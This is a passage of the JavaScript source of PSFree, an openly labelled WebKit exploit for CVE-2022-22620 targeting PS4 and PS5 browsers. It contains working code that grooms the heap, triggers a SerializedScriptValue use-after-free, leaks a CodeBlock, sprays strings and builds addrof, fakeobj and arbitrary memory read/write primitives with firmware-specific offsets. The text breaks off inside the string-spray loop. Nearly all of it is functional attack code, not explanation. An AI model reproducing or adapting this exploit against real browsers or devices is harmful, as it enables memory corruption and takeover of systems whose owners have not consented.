/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
//
// vulnerable:
// * PS4 [6.00, 9.60)
// * PS5 [1.00, 6.00)
//
// * CelesteBlue from ps4-dev on discord.com
//   * Helped in figuring out the size of WebCore::SerializedScriptValue and
//     its needed offsets on different firmwares.
//   * figured out the range of vulnerable firmwares
// * janisslsm from ps4-dev on discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares.
// * Kameleon_ from ps4-dev on discord.com - tester
// * SlidyBat from PS5 R&D discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares (PS5).
// Reimplementation by Feyzee61
// PSFree & Lapse Shared Variables & Subroutines

const off_js_butterfly = 0x8;
const off_js_inline_prop = 0x10;
const off_view_m_vector = 0x10;
const off_view_m_length = 0x18;
const off_view_m_mode = 0x1c;
const off_vector = 0x04; //off_view_m_vector / 4;
const off_vector2 = 0x05; //(off_view_m_vector + 4) / 4;
const off_strimpl_strlen = 4;
const off_strimpl_m_data = 8;
const off_strimpl_inline_str = 0x14;
const off_size_strimpl = 0x18;
const KB = 0x400; //1024;
const MB = 0x100000; //KB * KB;
const page_size = 0x4000; //16 * KB; // page size on ps4
const is_ps4 = 1;

var mem;
var config_target;

function isIntegerFix(x) {
  if (typeof x !== 'number') return 0;
  if (!isFinite(x)) return 0;
  if (Math.floor(x) !== x) return 0;
  return 1;
}

function check_not_in_range(x) {
  if (typeof x !== 'number') return 1;
  if (!isFinite(x)) return 1;
  if (Math.floor(x) !== x) return 1;
  if (x < (-0x80000000)) return 1;
  if (x > 0xffffffff) return 1;
  return 0;
}

window.log = function (msg, color) {
    if (color === undefined) color = "#cccccc";
    document.getElementById("console").innerHTML += '<span style="color:' + color + '">' + msg + '</span><br>';
};
// use this if you want to support objects convertible to Int but only need
// their low/high bits. creating a Int is slower compared to just using this
// function
function lohi_from_one(low) {
  if (low instanceof Int) {
    return low._u32.slice();
  }
  if (check_not_in_range(low)) {
    throw TypeError('low not a 32-bit integer');
  }
  return [low >>> 0, low < 0 ? -1 >>> 0 : 0];
}

// mostly used to yield to the GC. marking is concurrent but collection isn't
// yielding also lets the DOM update. which is useful since we use the DOM for
// logging and we loop when waiting for a collection to occur
function sleep(ms=0) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

class DieError extends Error {
  constructor(...args) {
    super(...args);
    this.name = this.constructor.name;
  }
}

function die(msg='') {
  throw new DieError(msg);
}

// immutable 64-bit integer
class Int {
  constructor(low, high) {
    if (high === undefined) {
      this._u32 = new Uint32Array(lohi_from_one(low));
      return;
    }
    if (check_not_in_range(low)) {
      throw TypeError('low not a 32-bit integer');
    }
    if (check_not_in_range(high)) {
      throw TypeError('high not a 32-bit integer');
    }
    this._u32 = new Uint32Array([low, high]);
  }
  get lo() {
    return this._u32[0];
  }
  get hi() {
    return this._u32[1];
  }
  // return low/high as signed integers
  get bot() {
    return this._u32[0] | 0;
  }
  get top() {
    return this._u32[1] | 0;
  }
  neg() {
    const u32 = this._u32;
    const low = (~u32[0] >>> 0) + 1;
    return new this.constructor(
      low >>> 0,
      ((~u32[1] >>> 0) + (low > 0xffffffff)) >>> 0
    );
  }
  eq(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    return (
      u32[0] === values[0]
      && u32[1] === values[1]
    );
  }
  ne(b) {
    return !this.eq(b);
  }
  add(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    const low = u32[0] + values[0];
    return new this.constructor(
        low >>> 0,
        (u32[1] + values[1] + (low > 0xffffffff)) >>> 0
    );
  }
  sub(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    const low = u32[0] + (~values[0] >>> 0) + 1;
    return new this.constructor(
      low >>> 0,
      (u32[1] + (~values[1] >>> 0) + (low > 0xffffffff)) >>> 0
    );
  }
  toString(is_pretty=false) {
    var low, high;
    if (!is_pretty) {
      low = this.lo.toString(16).padStart(8, '0');
      high = this.hi.toString(16).padStart(8, '0');
      return '0x' + high + low;
    }
    high = this.hi.toString(16).padStart(8, '0');
    high = high.substring(0, 4) + '_' + high.substring(4);
    low = this.lo.toString(16).padStart(8, '0');
    low = low.substring(0, 4) + '_' + low.substring(4);
    return '0x' + high + '_' + low;
  }
}

// alignment must be 32 bits and is a power of 2
function align(a, alignment) {
  if (!(a instanceof Int)) {
    a = new Int(a);
  }
  const mask = -alignment & 0xffffffff;
  const type = a.constructor;
  const low = a.lo & mask;
  return new type(low, a.hi);
}

function hex(number) {
  return '0x' + number.toString(16);
}

// no "0x" prefix
function hex_np(number) {
  return number.toString(16);
}

// expects a byte array
// converted to ES5 supported version
function hexdump(view) {
  var len = view.length;
  var num_16 = len & ~15;
  var residue = len - num_16;
  function chr(i) {
    return (0x20 <= i && i <= 0x7e) ? String.fromCharCode(i) : '.';
  }
  function to_hex(view, offset, length) {
    var out = [];
    for (var i = 0; i < length; i++) {
      var v = view[offset + i];
      var h = v.toString(16);
      if (h.length < 2) h = "0" + h;
      out.push(h);
    }
    return out.join(" ");
  }
  var bytes = [];
  // 16-byte blocks
  for (var i = 0; i < num_16; i += 16) {
    var long1 = to_hex(view, i, 8);
    var long2 = to_hex(view, i + 8, 8);
    var print = "";
    for (var j = 0; j < 16; j++) {
      print += chr(view[i + j]);
    }
    bytes.push([long1 + "  " + long2, print]);
  }
  // residual bytes
  if (residue) {
    var small = residue <= 8;
    var long1_len = small ? residue : 8;
    var long1 = to_hex(view, num_16, long1_len);
    if (small) {
      for (var k = residue; k < 8; k++) {
        long1 += " xx";
      }
    }
    var long2;
    if (small) {
      var arr = [];
      for (var k = 0; k < 8; k++) arr.push("xx");
      long2 = arr.join(" ");
    } else {
      long2 = to_hex(view, num_16 + 8, residue - 8);
      for (var k = residue; k < 16; k++) {
        long2 += " xx";
      }
    }
    var printRem = "";
    for (var k = 0; k < residue; k++) {
      printRem += chr(view[num_16 + k]);
    }
    while (printRem.length < 16) printRem += " ";
    bytes.push([long1 + "  " + long2, printRem]);
  }
  // print screen
  for (var pos = 0; pos < bytes.length; pos++) {
    var off = (pos * 16).toString(16);
    while (off.length < 8) off = "0" + off;
    var row = bytes[pos];
    log(off + " | " + row[0] + " |" + row[1] + "|");
  }
}

function gc() {
  new Uint8Array(4 * MB);
}

function add_and_set_addr(mem, offset, base_lo, base_hi) {
  const values = lohi_from_one(offset);
  const main = mem._main;
  const low = base_lo + values[0];
  // no need to use ">>> 0" to convert to unsigned here
  main[off_vector] = low;
  main[off_vector2] = base_hi + values[1] + (low > 0xffffffff);
}

class Addr extends Int {
  read8(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read8_at(offset);
  }
  read16(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read16_at(offset);
  }
  read32(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read32_at(offset);
  }
  read64(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read64_at(offset);
  }
  readp(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.readp_at(offset);
  }
  write8(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write8_at(offset, value);
  }
  write16(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write16_at(offset, value);
  }
  write32(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write32_at(offset, value);
  }
  write64(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write64_at(offset, value);
  }
}

function init_module(memory) {
  mem = memory;
}

// expected:
// * main - Uint32Array whose m_vector points to worker
// * worker - DataView
// addrof()/fakeobj() expectations:
// * obj - has a "addr" property and a 0 index.
// * addr_addr - Int, the address of the slot of obj.addr
// * fake_addr - Int, the address of the slot of obj[0]
// a valid example for "obj" is "{addr: null, 0: 0}". note that this example
// has [0] be 0 so that the butterfly's indexing type is ArrayWithInt32. this
// prevents the garbage collector from incorrectly treating the slot's value as
// a JSObject and then crash
// the relative read/write methods expect the offset to be a unsigned 32-bit
// integer
class Memory {
  constructor(main, worker, obj, addr_addr, fake_addr) {
    this._main = main;
    this._worker = worker;
    this._obj = obj;
    this._addr_low = addr_addr.lo;
    this._addr_high = addr_addr.hi;
    this._fake_low = fake_addr.lo;
    this._fake_high = fake_addr.hi;
    main[off_view_m_length / 4] = 0xffffffff;
    init_module(this);
    if (config_target >= 0x700) {
      const off_mvec = off_view_m_vector;
      // use this to create WastefulTypedArrays to avoid a GC crash
      const buf = new ArrayBuffer(0);
      const src = new Uint8Array(buf);
      const sset = new Uint32Array(buf);
      const sset_p = this.addrof(sset);
      sset_p.write64(off_mvec, this.addrof(src).add(off_mvec));
      sset_p.write32(off_view_m_length, 3);
      this._cpysrc = src;
      this._src_setter = sset;
      const dst = new Uint8Array(buf);
      const dset = new Uint32Array(buf);
      const dset_p = this.addrof(dset);
      dset_p.write64(off_mvec, this.addrof(dst).add(off_mvec));
      dset_p.write32(off_view_m_length, 3);
      dset[2] = 0xffffffff;
      this._cpydst = dst;
      this._dst_setter = dset;
    }
  }
  // dst and src may overlap
  cpy(dst, src, len) {
    if (!(isIntegerFix(len) && 0 <= len && len <= 0xffffffff)) {
      throw TypeError('len not a unsigned 32-bit integer');
    }
    const dvals = lohi_from_one(dst);
    const svals = lohi_from_one(src);
    const dset = this._dst_setter;
    const sset = this._src_setter;
    dset[0] = dvals[0];
    dset[1] = dvals[1];
    sset[0] = svals[0];
    sset[1] = svals[1];
    sset[2] = len;
    this._cpydst.set(this._cpysrc);
  }
  // allocate Garbage Collector managed memory. returns [address_of_memory,
  // backer]. backer is the JSCell that is keeping the returned memory alive,
  // you can drop it once you have another GC object reference the address.
  // the backer is an implementation detail. don't use it to mutate the
  // memory
  gc_alloc(size) {
    if (!isIntegerFix(size)) { throw TypeError('size not a integer'); }
    if (size < 0) { throw RangeError('size is negative'); }
    const fastLimit = 1000;
    size = ((size + 7) & ~7) >> 3;
    if (size > fastLimit) { throw RangeError('size is too large'); }
    const backer = new Float64Array(size);
    return [mem.addrof(backer).readp(off_view_m_vector), backer];
  }
  fakeobj(addr) {
    const values = lohi_from_one(addr);
    const worker = this._worker;
    const main = this._main;
    main[off_vector] = this._fake_low;
    main[off_vector2] = this._fake_high;
    worker.setUint32(0, values[0], true);
    worker.setUint32(4, values[1], true);
    return this._obj[0];
  }
  addrof(object) {
    // typeof considers null as a object. blacklist it as it isn't a
    // JSObject
    if (object === null || (typeof object !== 'object' && typeof object !== 'function')) {
      throw TypeError('argument not a JS object');
    }
    const obj = this._obj;
    const worker = this._worker;
    const main = this._main;
    obj.addr = object;
    main[off_vector] = this._addr_low;
    main[off_vector2] = this._addr_high;
    const res = new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
    obj.addr = null;
    return res;
  }
  // expects addr to be a Int
  _set_addr_direct(addr) {
    const main = this._main;
    main[off_vector] = addr.lo;
    main[off_vector2] = addr.hi;
  }
  set_addr(addr) {
    const values = lohi_from_one(addr);
    const main = this._main;
    main[off_vector] = values[0];
    main[off_vector2] = values[1];
  }
  get_addr() {
    const main = this._main;
    return new Addr(main[off_vector], main[off_vector2]);
  }
  read8(addr) {
    this.set_addr(addr);
    return this._worker.getUint8(0);
  }
  read16(addr) {
    this.set_addr(addr);
    return this._worker.getUint16(0, true);
  }
  read32(addr) {
    this.set_addr(addr);
    return this._worker.getUint32(0, true);
  }
  read64(addr) {
    this.set_addr(addr);
    const worker = this._worker;
    return new Int(worker.getUint32(0, true), worker.getUint32(4, true));
  }
  // returns a pointer instead of an Int
  readp(addr) {
    this.set_addr(addr);
    const worker = this._worker;
    return new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
  }
  read8_at(offset) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    return this._worker.getUint8(offset);
  }
  read16_at(offset) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    return this._worker.getUint16(offset, true);
  }
  read32_at(offset) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    return this._worker.getUint32(offset, true);
  }
  read64_at(offset) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    const worker = this._worker;
    return new Int(worker.getUint32(offset, true), worker.getUint32(offset + 4, true));
  }
  readp_at(offset) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    const worker = this._worker;
    return new Addr(worker.getUint32(offset, true), worker.getUint32(offset + 4, true));
  }
  write8(addr, value) {
    this.set_addr(addr);
    this._worker.setUint8(0, value);
  }
  write16(addr, value) {
    this.set_addr(addr);
    this._worker.setUint16(0, value, true);
  }
  write32(addr, value) {
    this.set_addr(addr);
    this._worker.setUint32(0, value, true);
  }
  write64(addr, value) {
    const values = lohi_from_one(value);
    this.set_addr(addr);
    const worker = this._worker;
    worker.setUint32(0, values[0], true);
    worker.setUint32(4, values[1], true);
  }
  write8_at(offset, value) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    this._worker.setUint8(offset, value);
  }
  write16_at(offset, value) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    this._worker.setUint16(offset, value, true);
  }
  write32_at(offset, value) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    this._worker.setUint32(offset, value, true);
  }
  write64_at(offset, value) {
    if (!isIntegerFix(offset)) {
      throw TypeError('offset not a integer');
    }
    const values = lohi_from_one(value);
    const worker = this._worker;
    worker.setUint32(offset, values[0], true);
    worker.setUint32(offset + 4, values[1], true);
  }
}

// DataView's accessors are constant time and are faster when doing multi-byte
// accesses but the single-byte accessors are slightly slower compared to just
// indexing the Uint8Array
// to get the best of both worlds, BufferView uses a DataView for multi-byte
// accesses and a Uint8Array for single-byte
// instances of BufferView will their have m_mode set to WastefulTypedArray
// since we use the .buffer getter to create a DataView
class BufferView extends Uint8Array {
  constructor(...args) {
      super(...args);
      this._dview = new DataView(this.buffer, this.byteOffset);
  }
  read8(offset) { return this._dview.getUint8(offset); }
  read16(offset) { return this._dview.getUint16(offset, true); }
  read32(offset) { return this._dview.getUint32(offset, true); }
  read64(offset) {
    return new Int(this._dview.getUint32(offset, true), this._dview.getUint32(offset + 4, true));
  }
  write8(offset, value) { this._dview.setUint8(offset, value); }
  write16(offset, value) { this._dview.setUint16(offset, value, true); }
  write32(offset, value) { this._dview.setUint32(offset, value, true); }
  write64(offset, value) {
    const values = lohi_from_one(value);
    this._dview.setUint32(offset, values[0], true);
    this._dview.setUint32(offset + 4, values[1], true);
  }
}

const num_reuses = 0x300;

var ssv_len;

function Init_PSFreeGlobals() {
  if (config_target < 0x650)
    ssv_len = 0x58;
  else if (config_target < 0x900)
    ssv_len = 0x48;
  else
    ssv_len = 0x50;
}

function sread64(str, offset) {
  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
  return new Int(low, high);
}

class Reader {
  constructor(rstr, rstr_view) {
    this.rstr = rstr;
    this.rstr_view = rstr_view;
    this.m_data = rstr_view.read64(off_strimpl_m_data);
  }
  read8_at(offset) {
    return this.rstr.charCodeAt(offset);
  }
  read32_at(offset) {
    const str = this.rstr;
    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
  }
  read64_at(offset) {
    return sread64(this.rstr, offset);
  }
  read64(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
    return sread64(this.rstr, 0);
  }
  set_addr(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
  }
  // remember to use this to fix up the StringImpl before freeing it
  restore() {
    this.rstr_view.write64(off_strimpl_m_data, this.m_data);
    const original_strlen = ssv_len - off_size_strimpl;
    this.rstr_view.write32(off_strimpl_strlen, original_strlen);
  }
}
//================================================================================================
// LEAK CODE BLOCK ===============================================================================
//================================================================================================
// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
// of JSValues whose size is ssv_len. the undefined constant is automatically
// added due to reasons such as "undefined is returned by default if the
// function exits without returning anything"
async function leak_code_block(reader, bt_size) {
  const num_leaks = 0x100;
  const rdr = reader;
  const bt = [];
  // take into account the cell and indexing header of the immutable
  // butterfly
  for (var i = 0; i < bt_size - 0x10; i += 8) {
    bt.push(i);
  }
  // cache the global variable resolution
  const slen = ssv_len;
  const idx_offset = ssv_len - (8 * 3);
  const strs_offset = ssv_len - (8 * 2);
  const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
  var res = 'var f = 0x11223344;\n';
  const cons_len = ssv_len - (8 * 5);
  for (var i = 0; i < cons_len; i += 8) {
    res += `var a${i} = ${num_leaks + i};\n`;
  }
  const src_part = res;
  const part = bt_part + src_part;
  const cache = [];
  for (var i = 0; i < num_leaks; i++) {
    cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
  }
  var chunkSize;
  if (is_ps4 && (config_target < 0x900))
    chunkSize = 128 * KB;
  else
    chunkSize = 1 * MB;
  const smallPageSize = 4 * KB;
  const search_addr = align(rdr.m_data, chunkSize);
  //log(`search addr: ${search_addr}`);
  //log(`func_src:\n${cache[0]}\nfunc_src end`);
  //log('start find CodeBlock');
  var winning_off = null;
  var winning_idx = null;
  var winning_f = null;
  var find_cb_loop = 0;
  // false positives
  var fp = 0;
  rdr.set_addr(search_addr);
  loop: while (true) {
    const funcs = [];
    for (var i = 0; i < num_leaks; i++) {
      const f = Function(cache[i]);
      // the first call allocates the CodeBlock
      f();
      funcs.push(f);
    }
    for (var p = 0; p < chunkSize; p += smallPageSize) {
      for (var i = p; i < p + smallPageSize; i += slen) {
        if (rdr.read32_at(i + 8) !== 0x11223344) {
          continue;
        }
        rdr.set_addr(rdr.read64_at(i + strs_offset));
        const m_type = rdr.read8_at(5);
        // make sure we're not reading the constant registers of an
        // UnlinkedCodeBlock. those have JSTemplateObjectDescriptors.
        // CodeBlock converts those to JSArrays
        if (m_type !== 0) {
          rdr.set_addr(search_addr);
          winning_off = i;
          winning_idx = rdr.read32_at(i + idx_offset);
          winning_f = funcs[winning_idx];
          break loop;
        }
        rdr.set_addr(search_addr);
        fp++;
      }
    }
    find_cb_loop++;
    gc();
    await sleep();
  }
  //log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
  //log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
  //log('CodeBlock.m_constantRegisters.m_buffer:');
  rdr.set_addr(search_addr.add(winning_off));
  //for (var i = 0; i < slen; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  const bt_offset = 0;
  const bt_addr = rdr.read64_at(bt_offset);
  const strs_addr = rdr.read64_at(strs_offset);
  //log(`immutable butterfly addr: ${bt_addr}`);
  //log(`string array passed to tag addr: ${strs_addr}`);
  //log('JSImmutableButterfly:');
  rdr.set_addr(bt_addr);
  //for (var i = 0; i < bt_size; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  //log('string array:');
  rdr.set_addr(strs_addr);
  //const off_size_jsobj = 0x10;
  //for (var i = 0; i < off_size_jsobj; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  return [winning_f, bt_addr, strs_addr];
}
//================================================================================================
// MAKE SSV DATA =================================================================================
//================================================================================================
// data to write to the SerializedScriptValue
// setup to make deserialization create an ArrayBuffer with an arbitrary buffer
// address
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
  // sizeof JSC::ArrayBufferContents
  var size_abc;
  if (is_ps4) {
    if (config_target >= 0x900) size_abc = 0x18;
    else size_abc = 0x20;
  } else {
    if (config_target >= 0x300) size_abc = 0x18;
    else size_abc = 0x20;
  }
  const data_len = 9;
  // sizeof WTF::Vector<T>
  const size_vector = 0x10;
  // SSV offsets
  const off_m_data = 8;
  const off_m_abc = 0x18;
  // view offsets
  const voff_vec_abc = 0; // Vector<ArrayBufferContents>
  const voff_abc = voff_vec_abc + size_vector; // ArrayBufferContents
  const voff_data = voff_abc + size_abc;
  // WTF::Vector<unsigned char>
  // write m_data
  // m_buffer
  ssv_buf.write64(off_m_data, view_p.add(voff_data));
  // m_capacity
  ssv_buf.write32(off_m_data + 8, data_len);
  // m_size
  ssv_buf.write64(off_m_data + 0xc, data_len);
  // 6 is the serialization format version number for ps4 6.00. The format
  // is backwards compatible and using a value less than the current version
  // number used by a specific WebKit version is considered valid.
  // See CloneDeserializer::isValid() from
  // WebKit/Source/WebCore/bindings/js/SerializedScriptValue.cpp at PS4 8.0x.
  const CurrentVersion = 6;
  const ArrayBufferTransferTag = 23;
  view.write32(voff_data, CurrentVersion);
  view[voff_data + 4] = ArrayBufferTransferTag;
  view.write32(voff_data + 5, 0);
  // std::unique_ptr<WTF::Vector<JSC::ArrayBufferContents>>
  // write m_arrayBufferContentsArray
  ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
  // write WTF::Vector<JSC::ArrayBufferContents>
  view.write64(voff_vec_abc, view_p.add(voff_abc));
  view.write32(voff_vec_abc + 8, 1);
  view.write32(voff_vec_abc + 0xc, 1);
  if (size_abc === 0x20) {
    // m_destructor, offset 0, leave as 0
    // m_shared, offset 8, leave as 0
    // m_data
    view.write64(voff_abc + 0x10, addr);
    // m_sizeInBytes
    view.write32(voff_abc + 0x18, size);
  } else {
    // m_data
    view.write64(voff_abc + 0, addr);
    // m_destructor (48 bits), offset 8, leave as 0
    // m_shared (48 bits), offset 0xe, leave as 0
    // m_sizeInBytes
    view.write32(voff_abc + 0x14, size);
  }
}
//================================================================================================
// PSFREE STAGE1 PREPARE UAF =====================================================================
//================================================================================================
function prepare_uaf() {
  const num_fsets = 0x180;
  const num_spaces = 0x40;
  const fsets = [];
  const indices = [];
  const rows = ','.repeat(ssv_len / 8 - 2);
  function alloc_fs(fsets, size) {
    for (var i = 0; i < size / 2; i++) {
      const fset = document.createElement('frameset');
      fset.rows = rows;
      fset.cols = rows;
      fsets.push(fset);
    }
  }
  // the first call to either replaceState/pushState is likely to allocate a
  // JSC::IsoAlignedMemoryAllocator near the SSV it creates. This prevents
  // the SmallLine where the SSV resides from being freed. So we do a dummy
  // call first
  history.replaceState('state0', '');
  alloc_fs(fsets, num_fsets);
  // the "state1" SSVs is what we will UAF
  history.pushState('state1', '', location.pathname + '#bar');
  indices.push(fsets.length);
  alloc_fs(fsets, num_spaces);
  history.pushState('state1', '', location.pathname + '#foo');
  indices.push(fsets.length);
  alloc_fs(fsets, num_spaces);
  history.pushState('state2', '');
  return [fsets, indices];
}
//================================================================================================
// PSFREE STAGE1 UAF SSV =========================================================================
//================================================================================================
// WebCore::SerializedScriptValue use-after-free
// be careful when accessing history.state since History::state() will get
// called. History will cache the SSV at its m_lastStateObjectRequested if you
// do. that field is a RefPtr, thus preventing a UAF if we cache "state1"
async function uaf_ssv(fsets, index, index2) {
  const views = [];
  const input = document.createElement('input');
  input.id = 'input';
  const foo = document.createElement('input');
  foo.id = 'foo';
  const bar = document.createElement('a');
  bar.id = 'bar';
  //log(`ssv_len: ${hex(ssv_len)}`);
  var pop = null;
  var pop2 = null;
  var pop_promise2 = null;
  var blurs = [0, 0];
  var resolves = [];
  function onpopstate(event) {
    const no_pop = pop === null;
    const idx = no_pop ? 0 : 1;
    //log(`pop ${idx} came`);
    if (blurs[idx] === 0) {
      const r = resolves[idx][1];
      //r(new DieError(`blurs before pop ${idx} came: ${blurs[idx]}`));
      r(new DieError('Blurs before pop came'));
    }
    if (no_pop) {
      pop_promise2 = new Promise((resolve, reject) => {
        resolves.push([resolve, reject]);
        addEventListener('popstate', onpopstate, {once: true});
        history.back();
      });
    }
    if (no_pop) {
      pop = event;
    } else {
      pop2 = event;
    }
    resolves[idx][0]();
  }
  const pop_promise = new Promise((resolve, reject) => {
    resolves.push([resolve, reject]);
    addEventListener('popstate', onpopstate, {once: true});
  });
  function onblur(event) {
    const target = event.target;
    const is_input = target === input;
    const idx = is_input ? 0 : 1;
    //log(`${target.id} blur came`);
    if (blurs[idx] > 0) {
      //die(`${name}: multiple blurs. blurs: ${blurs[idx]}`);
      die('Multiple blurs found');
    }
    // we replace the URL with the original so the user can rerun the
    // exploit via a reload. If we don't, the exploit will append another
    // "#foo" to the URL and the input element will not be blurred because
    // the foo element won't be scrolled to during history.back()
    history.replaceState('state3', '', location.pathname);
    // free the SerializedScriptValue's neighbors and thus free the
    // SmallLine where it resides
    const fset_idx = is_input ? index : index2;
    const num_adjs = 8;
    for (var i = fset_idx - num_adjs / 2; i < fset_idx + num_adjs / 2; i++) {
      fsets[i].rows = '';
      fsets[i].cols = '';
    }
    for (var i = 0; i < num_reuses; i++) {
      const view = new Uint8Array(new ArrayBuffer(ssv_len));
      view[0] = 0x41;
      views.push(view);
    }
    blurs[idx]++;
  }
  input.addEventListener('blur', onblur);
  foo.addEventListener('blur', onblur);
  document.body.append(input);
  document.body.append(foo);
  document.body.append(bar);
  // FrameLoader::loadInSameDocument() calls Document::statePopped().
  // statePopped() will defer firing of popstate until we're in the complete
  // state
  // this means that onblur() will run with "state2" as the current history
  // item if we call loadInSameDocument too early
  //log(`readyState now: ${document.readyState}`);
  if (document.readyState !== 'complete') {
    await new Promise(resolve => {
      document.addEventListener('readystatechange', function foo() {
        if (document.readyState === 'complete') {
          document.removeEventListener('readystatechange', foo);
          resolve();
        }
      });
    });
  }
  //log(`readyState now: ${document.readyState}`);
  await new Promise(resolve => {
    input.addEventListener('focus', resolve, {once: true});
    input.focus();
  });
  history.back();
  await pop_promise;
  await pop_promise2;
  //log('done await popstate');
  input.remove();
  foo.remove();
  bar.remove();
  const res = [];
  for (var i = 0; i < views.length; i++) {
    const view = views[i];
    if (view[0] !== 0x41) {
      //log(`view index: ${hex(i)}`);
      //log('found view:');
      //log(view);
      // set SSV's refcount to 1, all other fields to 0/NULL
      view[0] = 1;
      view.fill(0, 1);
      if (res.length) {
        res[1] = [new BufferView(view.buffer), pop2];
        break;
      }
      // return without keeping any references to pop, making it GC-able.
      // its WebCore::PopStateEvent will then be freed on its death
      res[0] = new BufferView(view.buffer);
      i = num_reuses - 1;
    }
  }
  if (res.length !== 2) {
    die('Failed SerializedScriptValue UAF');
  }
  return res;
}
//================================================================================================
// PSFREE STAGE2 MAKE RDR ========================================================================
//================================================================================================
// We now have a double free on the fastMalloc heap
async function make_rdr(view) {
  var str_wait = 0;
  const strs = [];
  const u32 = new Uint32Array(1);
  const u8 = new Uint8Array(u32.buffer);
  const original_strlen = ssv_len - off_size_strimpl;
  const marker_offset = original_strlen - 4;
  const pad = 'B'.repeat(marker_offset);
  // Clean memory region
  if (config_target >= 0x700) {
    for (var i = 0; i < 5; i++) {
      gc();
      await sleep(50); // wait 50ms, allow DOM update and GC completion
    }
  }
  // Start String Spray
  //log('start string spray');
  const num_strs = 0x200;
  while (true) {
    for (var i = 0; i < num_strs; i++) {
      u32[0] = i;
      // on versions like 8.0x:
      // * String.fromCharCode() won't create a 8-bit string. so we use
      //   fromCodePoint() instead
      // * Array.prototype.join() won't try to convert 16-bit strings to
      //   8-bit
      //
      // given the restrictions above, we will ensure "str" is always a
      // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
      // to see that String.prototype.repeat() will create a 8-bit string
      // if the repeated string's length is 1
      //
      // Array.prototype.join() calls JSC::JSStringJoiner::join(). it
      // returns a plain JSString (not a JSRopeString). that means we
      // have allocated a WTF::StringImpl with the proper size and whose
      // string data is inlined
      const str = [pad, String.fromCodePoint(...u8)].join('');
      strs.push(str);
    }
    if (view.read32(off_strimpl_inline_str) === 0x42424242) {
